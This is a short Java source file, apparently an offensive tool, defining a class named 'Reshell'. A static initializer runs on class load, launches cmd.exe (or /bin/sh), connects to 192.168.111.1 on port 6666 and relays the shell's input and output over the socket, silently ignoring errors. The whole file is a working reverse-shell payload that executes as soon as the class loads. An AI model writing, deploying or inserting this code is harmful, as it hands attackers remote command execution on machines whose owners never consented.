package tools;

public class Reshell{
    static {
        try{
            String host = "192.168.111.1";
            int port = 6666;
            String cmd = "cmd.exe";
            //String cmd = "/bin/sh";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            java.net.Socket s = new java.net.Socket(host, port);
            java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        } catch (Exception e){}
    }
}